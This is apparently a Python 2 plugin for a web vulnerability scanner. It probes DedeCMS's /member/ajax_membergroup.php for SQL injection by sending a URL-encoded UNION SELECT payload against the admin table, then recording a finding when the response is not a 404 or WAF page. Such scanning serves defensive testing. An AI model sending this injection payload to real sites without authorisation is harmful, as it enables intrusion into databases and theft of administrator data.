#!/usr/bin/python
# -*- coding: utf-8 -*-
from engine.engine_utils.common import *
from engine.logger import scanLogger as logger
from engine.engine_utils.rule_result_judge import page_similar


def run_domain(http,ob):
    '''
    未启用，无效插件， 与DedeCms5_7Ajax_membergroupSqlInjectionScript_yd.py重复
    :param http:
    :param ob:
    :return:
    '''
    result = []
    try:

        frame = ob.get('siteType')
        if frame and frame in ['jsp', 'asp', 'aspx']:
            return []

        scheme = ob['scheme']
        domain = ob['domain']
        header = {'Host': domain}
        source_ip = ob.get('source_ip')
        if source_ip:
            domain = source_ip
        result = []

        inj_path_list = [
            "/member/ajax_membergroup.php?action=post&membergroup=%40%60%27%60+Union+select+" \
                   "userid+from+%60%23%40__admin%60+where+1+or+id%3d%40%60%27%60",

            "/dede/member/ajax_membergroup.php?action=post&membergroup=%40%60%27%60+Union+select+" \
                   "userid+from+%60%23%40__admin%60+where+1+or+id%3d%40%60%27%60"
            ]

        for inj_path in inj_path_list:
            new_url = "%s://%s%s" % (scheme, domain, inj_path)
            res, content = http.request(new_url, 'GET', headers=header)
            # if res and res.get('status') == '200' and re.search(r'<h2>(.*?)</h2>', content):
            if res and res.get('status') == '200' and content:
                if page_similar(res.get('status'), content, ob.get('404_page')):
                    continue
                if page_similar(res.get('status'), content, ob.get('waf_page')):
                    continue
                detail = '检测到织梦CMS\'/member/ajax_membergroup.php\'SQL注入漏洞'
                request = getRequest(new_url, domain=ob['domain'])
                response = getResponse(res,content)
                result.append(getRecord(ob, new_url, ob['level'], detail, request, response))

    except Exception, e:
        logger.error("File:DedeCms5_1TagSqlInjection1Script_yd.py, run_domain function :%s" % (str(e)))

    return result

